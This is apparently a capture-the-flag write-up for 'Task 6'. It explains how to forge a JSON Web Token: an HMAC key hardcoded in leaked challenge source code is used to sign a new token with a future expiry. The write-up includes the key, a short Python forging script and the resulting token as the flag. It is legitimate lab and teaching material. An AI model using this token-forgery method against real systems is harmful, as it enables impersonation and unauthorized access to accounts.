# Task 6

Prompt:
![](../img/prompts/task_6.png)

The first step to take with any JWT token is to plug it into https://jwt.io.

It seems as if the token is way past its expiration date:
![](../img/6/jwt_orig.png)

In order to create a new valid token, we need the HMAC key. Fortunately, we were able to get the website's source code from task B2, which includes JWT validation code. Looking closer at `util.py`, we can find the HMAC key in the code:

```py
43   │ def hmac_key():
44   │     return "7c4x7hYaNgFvBckbwjfHs5h2lbUKInZJ"
```

With this knowledge, we can forge our own JWT tokens. We can set the expiration time to something in the future, making the token valid.

I wrote a quick script to create valid tokens:

```py
import jwt
from datetime import datetime, timedelta
import requests

def hmac_key():
    return "7c4x7hYaNgFvBckbwjfHs5h2lbUKInZJ"

def generate_token():
    """ Generate a new login token for the given user, good for 30 days"""
    now = datetime.now()
    exp = now + timedelta(days=30)
    claims = {'iat': now,
              'exp': exp,
          'uid': 36828,
          'sec': "m5ehCyJiYpRRSI2DMQWhNM1jIIE1HiuW"}
    return jwt.encode(claims, hmac_key(), algorithm='HS256')

tok = generate_token()#.decode()

print(tok)
```

Any valid token works as the flag, so the output should work just fine!

Flag: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjI1MDM5OTAsImV4cCI6MTY2NTA5NTk5MCwidWlkIjozNjgyOCwic2VjIjoibTVlaEN5SmlZcFJSU0kyRE1RV2hOTTFqSUlFMUhpdVcifQ.sYtPx-nuiRySL9hJi85P0MuP1_q3YMSbUXmcICxzn1M`
![](../img/submissions/task_6_solve.png)